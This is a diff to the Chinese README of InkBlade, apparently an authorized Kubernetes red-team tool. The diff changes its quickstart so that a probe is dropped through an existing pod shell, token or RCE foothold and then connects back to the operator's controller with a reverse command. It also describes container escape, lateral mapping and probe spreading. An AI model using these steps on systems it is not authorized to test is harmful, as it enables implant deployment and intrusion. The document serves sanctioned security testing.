@@ -43,58 +43,69 @@ InkBlade 把一个静态链接的 Rust 探针放进已授权的 Pod，用声明�
 
 | # | 阶段 | 发生什么 | 产物 |
 |---:|---|---|---|
-| 1 | 立足 | 会话记录入口方式：`kubeconfig`、`external` 或 `foothold`，以及目标、命名空间、Pod 与凭据指纹 | 会话记录、审计轨迹 |
-| 2 | Rust 探针 | 静态探针经 `kubectl`、ServiceAccount token、共享卷、EphemeralContainer 或授权 RCE 回调投放 | 探针身份、SHA-256 |
-| 3 | 通道 | 控制端通过探针 stdio 使用 HMAC 认证、长度前缀的 JSON 协议；通道可在回环上开 SOCKS5 与端口转发 | 通道状态、任务日志 |
+| 1 | 立足 | 会话记录你已有的入口：`foothold`（shell、ServiceAccount token 或授权 RCE）或 `external`（有界可达性证明）；`kubeconfig` 是可选的批量 bootstrap 模式 | 会话记录、审计轨迹 |
+| 2 | Rust 探针 | 静态探针经立足点投放 —— ServiceAccount token、RCE 回调，或可选的 `kubectl` 路径；foothold/external 入口不需要 kubeconfig | 探针身份、SHA-256 |
+| 3 | 通道 | 控制端监听，探针从 Pod 内主动回连；存在本地命令通道时也可用 stdio 通道 | 通道状态、任务日志 |
 | 4 | 检测 | 模板在 Pod 内按十层执行；每个结果带步骤、检查项、发现与产物 | 发现、证据锚 |
 | 5 | 逃逸 | 通过范围内的 Operator、驱动、CSI、运行时与内核面测试容器与节点边界 | 逃逸路径、证明 |
 | 6 | 横向 | 从探针所在网络命名空间测绘服务、控制面、网关与 fabric 可达性 | 可达图、跳板 |
-| 7 | 多探针 | 子探针把探针树扩展到更多 Pod 与命名空间；每个子探针有独立 token 和更严格的预算 | 探针树、血缘 |
+| 7 | 多探针 | 子探针由父探针用 `probe upload` + `probe spawn` 投放并回连控制端；每个子探针有独立 token 和更严格的预算 | 探针树、血缘 |
 | 8 | 跨集群 | `agent relay` 连接多个集群；`agent coverage` 记录目标图里哪些节点已闭合、哪些不可达 | 中继状态、覆盖证明 |
 | 9 | 报告 / 规则 / 可视化 | 双语报告、SARIF/OCSF/VEX 导出、可重放规则包与本地控制台 | 报告、规则包、控制台 |
 
 ## 快速开始
 
-在你有权测试的环境中运行。
+从控制台开始，接入你已有的探针或立足点。kubeconfig 不是前置条件。
+
+| 入口 | 适用场景 | kubeconfig |
+|---|---|---|
+| `foothold` | 默认：普通/最低权限 Pod（非 root、无 hostPath/privileged、仅出站 TCP），已有 shell、SA token 或授权 RCE | 不需要 |
+| `external` | 目标可达，并能附上有界可达性证明 | 不需要 |
+| `kubeconfig` | 可选的首次批量 bootstrap，一次投放多颗探针 | 可选 |
 
 ```bash
-# 1. 安装控制端
+# 1. 安装并启动控制台
 python -m pip install -e .
-
-# 2. 打开接入向导：工作区、授权、kubeconfig
 python -m inkblade up
 
-# 3. 签授权记录：目标、范围、级别、时间窗
-python -m inkblade quickstart
+# 2. 浏览器登录
+#    控制台打印一次性 admin 密码，监听 127.0.0.1:8765。
 
-# 4. 导入 kubeconfig 并打开授权会话
+# 3. 接入已有探针：探针主动回连控制端
+python -m inkblade probe list
+python -m inkblade channel listen
+#    Pod 内：inkblade-probe reverse --host <controller> --port <port>
+
+# 4. 从最低权限立足点首次投放（只需出站 TCP）
 python -m inkblade session open \
-  --mode kubeconfig \
-  --workspace ./work \
-  --kubeconfig ~/.kube/config \
-  --namespace ml-team \
-  --pod infer-0
+  --mode foothold \
+  --target <target> \
+  --credential-source pod-shell \
+  --namespace <namespace> \
+  --pod <pod>
 
-# 5. 把探针投放进目标 Pod
 python -m inkblade probe deploy \
   --session <session-id> \
-  --via kubectl \
+  --via rce \
   --binary ./inkblade-probe-linux-amd64 \
-  --namespace ml-team \
-  --pod infer-0 \
+  --probe-token-file ./probe.token \
   --allow-write
 
-# 6. 用 Agent 驱动探针
+# 5. 用 Agent 通过探针通道执行
 python -m inkblade agent run \
   --probe <probe-id> \
   --objective read-only-recon \
   --workspace ./work
 
-# 7. 出报告
+# 6. 出报告
 python -m inkblade report --run <run-id> --lang bi
 ```
 
-`inkblade up` 创建工作区、检查授权记录并引导导入 kubeconfig；`quickstart` 写出绑定范围、级别与时间窗的签署记录；`probe deploy` 不带 `--allow-write` 时只出投放计划，带上后才真正投放并注册探针；`agent run` 打印 `report` 需要的 `run_id`。
+`inkblade up` 创建工作区、打印一次性 admin 密码，并在回环地址上提供控制台；在浏览器里登录。首次投放前用 `inkblade quickstart`（或控制台）签署授权记录：目标、范围、级别与时间窗。
+
+默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。控制端用 `channel listen` 监听，Pod 内探针用 `inkblade-probe reverse --host <controller> --port <port>` 主动回连。还没有探针时，`session open --mode foothold` 记录你已有的 shell、SA token 或授权 RCE，`probe deploy --via rce|sa-token` 通过它投放第一颗探针。子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可用 stdio 通道（`channel start --session <id>`），但默认路径不依赖它。
+
+**可选：首次批量投放使用 kubeconfig。** 如果你持有运维 kubeconfig，想一次给多个 Pod 做 bootstrap，仍可使用 `session open --mode kubeconfig --kubeconfig <path>` 与 `probe deploy --via kubectl`。上面的探针优先流程不依赖它。
 
 ## 命令表
 
@@ -104,7 +115,7 @@ python -m inkblade report --run <run-id> --lang bi
 | 授权记录 | `inkblade quickstart`、`inkblade roe` |
 | 会话 | `inkblade session open` / `status` / `close` / `run` |
 | 探针投放 | `inkblade probe deploy` / `list` / `collect` / `exec` / `read-file` / `list-files` / `upload` / `download` / `spawn` / `cleanup` |
-| 通道 | `inkblade channel start` / `status` / `stop` |
+| 通道 | `inkblade channel listen` / `start` / `status` / `stop` |
 | 单模板 | `inkblade session run --id <session> --module <key>` 或 `inkblade run --module <key>` |
 | 链执行 | `inkblade execute --chain <id> --dry-run`，确认后 `inkblade execute --chain <id>` |
 | Agent | `inkblade agent run` / `status` / `trace` / `resume` / `replay` / `stop` |
